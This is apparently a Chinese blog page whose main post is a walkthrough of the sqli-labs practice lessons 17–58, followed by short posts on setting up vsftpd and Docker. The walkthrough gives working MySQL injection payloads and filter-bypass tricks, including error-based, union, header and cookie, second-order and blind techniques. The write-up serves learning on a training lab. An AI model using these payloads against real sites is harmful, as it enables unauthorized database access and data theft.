+<h1 id="背景知识-4："><a href="#背景知识-4：" class="headerlink" title="背景知识 4："></a>背景知识 4：</h1><h2 id="MySQL-数据库中的增删改查"><a href="#MySQL-数据库中的增删改查" class="headerlink" title="MySQL 数据库中的增删改查"></a>MySQL 数据库中的增删改查</h2><p>查就是 select,增是 insert,删就是 delect 或 drop,改就是 update</p>
+<p>增：insert into users values(‘16’,’lcamry’,’lcamry’);</p>
+<p>删：<br>删数据<br>delete from 表名;<br>delete from 表名 where id=1;<br>删节构<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;</p>
+<p>改：<br>修改所有：updata 表名 set 列名=’新的值，非数字加单引号’ ;<br>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’ where id=6;</p>
+<p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串<br>预定义字符：单引号，双引号，反斜杠，null<br>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串<br>用了这个以后就不能用’或”来闭合前面的语句了</p>
+<p>stripslashes()删除由 addslashes()添加的反斜线</p>
+<p>mysql_real_escape_string(string,connection)转义 sql 语句中使用字符串中的特殊字符<br>\x00<br>\n<br>\r<br>‘<br>“<br>\x1a<br>都会受到影响，若成功，返回被转义的字符串，若失败，返回 false</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17:"></a>less-17:</h3><p>（这题我还以为是用更改数据的方式改密码呐，原来是在改密码的界面爆数据。。。）<br>本关中的 username 被限制了，所以只能在 password 输入<br>输入：<br>123’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#<br>在 concat()里替换成要查询的语句，注意用括号括起来，并且需要 limit 限制，不然查询不出来</p>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18:"></a>less-18:</h3><p>输入 admin，admin 测试后发现会查询 IP 和 user agent，所以通过 burp 抓包后修改这两个地方的参数，加入 sql 查询语句<br>‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+<h3 id="less-19："><a href="#less-19：" class="headerlink" title="less-19："></a>less-19：</h3><p>测试后发现返回的是 referer<br>构造查询语句<br>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1</p>
+<h3 id="less-20："><a href="#less-20：" class="headerlink" title="less-20："></a>less-20：</h3><p>测试后发现在 cookie 处可以注入，还是用 burp 抓包后更改为 sql 注入语句<br>这里是通过 cookie 来获取 uname 的，所以改成下面这样<br>uname=admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</p>
+<h3 id="less-21："><a href="#less-21：" class="headerlink" title="less-21："></a>less-21：</h3><p>这里对 cookie 进行了 base64 处理，所以只要把要注入的 SQL 语句转换成 base64 就行</p>
+<h3 id="less-22："><a href="#less-22：" class="headerlink" title="less-22："></a>less-22：</h3><p>同样是 base64 处理，但是要注意前面闭合的时候要用双引号</p>
+<h4 id="HTTP-头部详解"><a href="#HTTP-头部详解" class="headerlink" title="HTTP 头部详解"></a>HTTP 头部详解</h4><p>1、 Accept：告诉 WEB 服务器自己接受什么介质类型，<em>/</em> 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</p>
+<p>2、Accept-Charset： 浏览器申明自己接收的字符集，Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），Accept-Language：：浏览器申明自己接收的语言</p>
+<p>语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。</p>
+<p>3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</p>
+<p>4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</p>
+<p>5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</p>
+<p>6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）</p>
+<p>7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。</p>
+<p>响应：close（连接已经关闭）。<br>keepalive（连接保持着，在等待本次连接的后续请求）。<br>Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</p>
+<p>8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p>
+<p>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</p>
+<p>10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</p>
+<p>11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</p>
+<p>12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</p>
+<p>13、 ETag：就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</p>
+<p>14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟 WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</p>
+<p>15、 Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</p>
+<p>16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</p>
+<p>17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</p>
+<p>18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</p>
+<p>19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</p>
+<p>20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</p>
+<p>21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</p>
+<p>22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部 指 定 的 位 置 去 取 。 例 如 ： Location ： <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif" target="_blank" rel="noopener">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a></p>
+<p>23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache</p>
+<p>24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p>
+<p>25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-</p>
+<p>26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></p>
+<p>27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</p>
+<p>28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</p>
+<p>29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</p>
+<p>30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</p>
+<p>31、补充： X-Forwarded-For，用来伪造请求的 IIP 地址</p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>对#跟–做了过滤，<br>$reg = “/#/“;<br>$reg1 = “/–/“;<br>$replace = “”;<br>$id = preg_replace($reg, $replace, $id);<br>$id = preg_replace($reg1, $replace, $id);</p>
+<p>需要用单引号去闭合后面的：<br><a href="http://43.247.91.228:84/Less-23/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-23/?id=-1</a>‘ union select 1,2,’3<br>可以发现 2，3 回显</p>
+<p><a href="http://43.247.91.228:84/Less-23/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-23/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’3</p>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次注入，先注册一个 admin’#的用户名，然后当修改密码的时候会执行一下查询语句</p>
+<p>update user set password=’修改的密码’ where username=’admin’#’<br>这样就成功修改了 admin  的密码了</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤掉了 or  和 and  测试的时候用 ||  就可以，注入的时候 information 要改成 infoorrmation，来补上 or</p>
+<p><a href="http://43.247.91.228:84/Less-25/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+</p>
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>不闭合的情况下执行 25 关的就可以<br><a href="http://43.247.91.228:84/Less-25a/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-25a/?id=-1</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+</p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>注释被过滤掉，可以使用单引号闭合，?id=-1’ or ‘1’=’1<br>同时  or  也被注释掉了，需要双写绕过 infoormation</p>
+<p>空格过滤了，用下面这些替换<br>%09    TAB 键（水平）<br>%0a    新建一行<br>%0b    TAB 键（垂直）<br>%0c    新的一页<br>%0d    return 功能<br>%a0    空格</p>
+<p><a href="http://43.247.91.228:84/Less-26/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-26/?id=-1&#39;</a> union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=’security’),’3</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>改成了用 (‘’)  来闭合<br><a href="http://43.247.91.228:84/Less-26a/?id=100&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-26a/?id=100&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||</a>(‘1</p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤 select  和 union  但是大小写绕过<br><a href="http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,2,3||&#39;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,2,3||&#39;1</a></p>
+<p>注出表名<br><a href="http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&#39;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27/?id=100&#39;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&#39;1</a></p>
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>这关闭合用的是 “<br><a href="http://43.247.91.228:84/Less-27a/?id=100&quot;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&quot;1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-27a/?id=100&quot;%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3||&quot;1</a></p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>闭合用的是 ‘)  但是竟然没有过滤 select 和 union !?<br><a href="http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(2),(3)||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(2),(3)||</a>(‘1</p>
+<p><a href="http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),(3)||" target="_blank" rel="noopener">http://43.247.91.228:84/Less-28/?id=10000&#39;)union%a0select%a0(1),(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),(3)||</a>(‘1</p>
+<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>跟之前的 28 一样啊！？</p>
+<h3 id="less-29-31"><a href="#less-29-31" class="headerlink" title="less-29-31"></a>less-29-31</h3><p>29  主要是用了两个服务器，第一个充当 waf<br>第一个服务器时 tomcat 第二个是 apache，tomcat 解析参数时从前面解析，apache 解析参数时从后面解析，所以可以传递两个参数 ?id=1&amp;id=2  他会解析第二个</p>
+<p><a href="http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;</a> union select 1,2,3–+<br><a href="http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-29/?id=1&amp;id=1000&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>30 只是用 “  来限定<br>31 用 “)</p>
+<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>宽字节注入，，只需要在 ‘  前面加上个 %aa  让转义字符失效就可以了<br><a href="http://43.247.91.228:84/Less-32/?id=-1%aa&#39;union" target="_blank" rel="noopener">http://43.247.91.228:84/Less-32/?id=-1%aa&#39;union</a> select 1,2,3–+</p>
+<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p><a href="http://43.247.91.228:84/Less-33/?id=-1%aa&#39;union" target="_blank" rel="noopener">http://43.247.91.228:84/Less-33/?id=-1%aa&#39;union</a> select 1,2,3–+</p>
+<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>post 方式，没法 urlencode，所以使用：<br>�’or 1=1#<br>�’union select 1,2#<br>�’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#</p>
+<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p><a href="http://43.247.91.228:84/Less-35/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-35/?id=-1</a> or 1=1–+</p>
+<p><a href="http://43.247.91.228:84/Less-35/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-35/?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479–+</p>
+<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p><a href="http://43.247.91.228:84/Less-36/?id=-1%aa&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-36/?id=-1%aa&#39;</a> union select 1,2,3–+</p>
+<p><a href="http://43.247.91.228:84/Less-36/?id=-1%aa&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-36/?id=-1%aa&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479–+</p>
+<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>�’union select 1,2#</p>
+<p>�’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#</p>
+<h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p><a href="http://43.247.91.228:84/Less-38/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-38/?id=-1&#39;</a> union select 1,2,3–+</p>
+<p><a href="http://43.247.91.228:84/Less-38/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-38/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<h1 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h1><h3 id="less-38-40："><a href="#less-38-40：" class="headerlink" title="less-38-40："></a>less-38-40：</h3><p>堆叠注入，不同的是 sql 查询语句不一样，有的是 ‘’ 有的是数字型，有的是（’’）类型的，只需要闭合就可以了</p>
+<h3 id="less-41-45"><a href="#less-41-45" class="headerlink" title="less-41-45"></a>less-41-45</h3><p>知识换成了 post 方式，在 password 处没有过滤，使用上面的攻击就可以</p>
+<h1 id="ORDER-BY-注入"><a href="#ORDER-BY-注入" class="headerlink" title="ORDER BY  注入"></a>ORDER BY  注入</h1><p>order by  不能使用  union select，先来了解一下  order by  的一些参数<br>asc  升序，desc  降序，如果在后面分别试这两个，排序结果不一样那么就说明可能存在注入<br>由于 order by 后面只能接 (字段名，位置，表达式) 等信息，如果并不能向原来一样使用联合查询。这里面直接使用 sort=(select …) 的方式来实现报错注入</p>
+<h2 id="order-by-报错注入"><a href="#order-by-报错注入" class="headerlink" title="order by 报错注入"></a>order by 报错注入</h2><p>这是在 mysql  下测试的报错语句，可以用到<br>select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~security’        //获取当前数据库</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’      //获取数据库版本</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’     //获取用户</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~E:\soft\phpmystudy\MySQL\data&#39;        //获取数据库路径</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~Win32’      //获取操作系统</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~E:/soft/phpmystudy/MySQL/‘       //mysql 安装路径</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’      //获取连接数据库的用户名</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select current_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’      //获取当前用户名</p>
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost’        //获取系统用户名</p>
+<p>通过报错注入例如：<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(updatexml(1,concat(0x7e,(select @@version),0x7e),1))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e),1))</p>
+<h2 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by  盲注"></a>order by  盲注</h2><p>##</p>
+<p>select _ from users order by id ^(select(select version()) regexp ‘^5’);  不正常排序<br>select _ from users order by id ^(select(select version()) regexp ‘^aaaa’);  正常排序</p>
+<p>因为异或 0  的时候相当于啥都不做，，所以只要是显示乱序就表示这个猜对了</p>
+<h3 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h3><p><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br><a href="http://43.247.91.228:84/Less-46/?sort=" target="_blank" rel="noopener">http://43.247.91.228:84/Less-46/?sort=</a>(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e)))</p>
+<h3 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h3><p>前面改成了 ‘ $id ‘，只需要闭合单引号就可以了<br><a href="http://43.247.91.228:84/Less-47/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-47/?sort=1&#39;</a> and 1=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))–+<br><a href="http://43.247.91.228:84/Less-47/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-47/?sort=1&#39;</a> and 1=(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x7e)))–+</p>
+<h3 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h3><p>不返回错误信息，盲注！<br>根据上面的，慢慢试吧！？<br><a href="http://43.247.91.228:84/Less-48/?sort=id" target="_blank" rel="noopener">http://43.247.91.228:84/Less-48/?sort=id</a> ^(select(select version()) regexp ‘^5’)</p>
+<h3 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h3><p>又用了单引号闭合，还需要绕过单引号<br>这里可以通过基于时间的盲注来实现（上面哪种方法还没试出来怎么绕过那个单引号）<br><a href="http://43.247.91.228:84/Less-49/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-49/?sort=1&#39;</a> and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
+<h3 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h3><p>题目说的是堆叠注入，但是报错注入也是可以的</p>
+<h3 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h3><p>单引号引起来了，绕过正常注入</p>
+<h3 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h3><p><a href="http://43.247.91.228:84/Less-52/?sort=id" target="_blank" rel="noopener">http://43.247.91.228:84/Less-52/?sort=id</a> ^(select(select version()) regexp ‘^5.5.4’)</p>
+<h3 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h3><p>基于时间的盲注<br><a href="http://43.247.91.228:84/Less-49/?sort=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-49/?sort=1&#39;</a> and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
+<h3 id="less-54-57"><a href="#less-54-57" class="headerlink" title="less-54-57"></a>less-54-57</h3><p>很简单的注入，限制了次数，不过只要试出来是怎么界定的就可以了</p>
+<h3 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h3><p>通过 updatexml()报错注入</p>
+<p><a href="http://43.247.91.228:84/Less-58/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-58/?id=-1&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’FECY4FSQDF’),0x7e),1)–+</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/07/wgbfv8/" data-id="ckco53qc300128ou96b4raflb" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-gghabh" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/24/gghabh/">配置ftp</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/12/24/gghabh/" class="article-date">
+  <time datetime="2019-12-24T11:58:59.000Z" itemprop="datePublished">2019-12-24</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>安装 vsftpd 服务器<br><code>apt install vsftpd</code></p>
+<p><code>vim /etc/vsftpd.user_allowlist</code><br>添加用户名</p>
+<p>进入<br><code>vim /etc/vsftpd.conf</code></p>
+<p>把 write_enable=YES  前面的注释去掉，添加下面三行<br><code>userlist_file=/etc/vsftpd.user_allowlist</code><br><code>userlist_enable=YES</code><br><code>userlist_deny=NO</code></p>
+<p>重启：<br><code>/etc/init.d/vsftpd restart</code></p>
+<p>在主机上安装类似 ftp 工具（我用的是 FileZilla），连接就可以了</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2019/12/24/gghabh/" data-id="ckco50dda00052wu93yw02wck" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-fucdy1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/20/fucdy1/">docker相关</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/12/20/fucdy1/" class="article-date">
+  <time datetime="2019-12-20T06:58:21.000Z" itemprop="datePublished">2019-12-20</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p><a href="https://www.bilibili.com/video/av58402749" target="_blank" rel="noopener">docker 快速入门</a><br><a href="http://play-with-docker.com/" target="_blank" rel="noopener">docker 在线实验</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1576829447658-5cd072ce-9953-4177-8c7d-1e49c2413016.png#align=left&display=inline&height=321&name=image.png&originHeight=641&originWidth=964&size=46462&status=done&style=none&width=482" alt="image.png"></p>
+<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>启动<br><code>systemctl start docker</code></p>
+<p>守护进程重启<br><code>systemctl daemon-reload</code></p>
+<p>重启 docker 服务<br><code>systemctl restart docker / service docker restart</code></p>
+<p>关闭<br><code>docker service docker stop / docker systemctl stop docker</code></p>
+<p>运行一个容器，命名为 yichen<br><code>docker run -d -p 10001:80 --name yichen apacje</code></p>
+<p>进入容器里面，开一个 bash<br><code>docker exec -it id /bin/bash</code></p>
+<p>重启容器<br><code>docker restart id</code></p>
+<p>关闭容器<br><code>docker stop id</code></p>
+<p>删除容器<br><code>docker rm -f id</code></p>
+<p>通过提交一个镜像<br><code>docker commit id yichen</code></p>
+<p>查看运行的 docker<br><code>docker ps</code></p>
+<p>重命名一下<br><code>docker rename 原容器名 新容器名</code></p>
+<h1 id="搭建-web-环境"><a href="#搭建-web-环境" class="headerlink" title="搭建 web 环境"></a>搭建 web 环境</h1><p>拉取一个 apache-php5<br><code>docker pull registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5</code></p>
+<p>运行<br><code>docker run -d -p 2027:80 registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5</code></p>
+<p>把题目复制到/var/www 目录下面<br><code>docker cp ./web2 0c7b9ddc107a:/var/www</code></p>
+<p>出现这些问题使用  <code>chmod 777 文件名</code> 给权限</p>
+<blockquote>
+<p>Warning: Unknown: failed to open stream: Permission denied in Unknown on line 0<br>Fatal error: Unknown: Failed opening required ‘/var/www/index.php’ (include_path=’.:/usr/local/lib/php’) in Unknown on line 0</p>
+</blockquote>
+<h1 id="搭建-pwn-环境"><a href="#搭建-pwn-环境" class="headerlink" title="搭建 pwn 环境"></a>搭建 pwn 环境</h1><p>这样可以在实体机单个匹配一条命令<br><code>socat tcp-l:8887,fork exec:./pwn1</code></p>
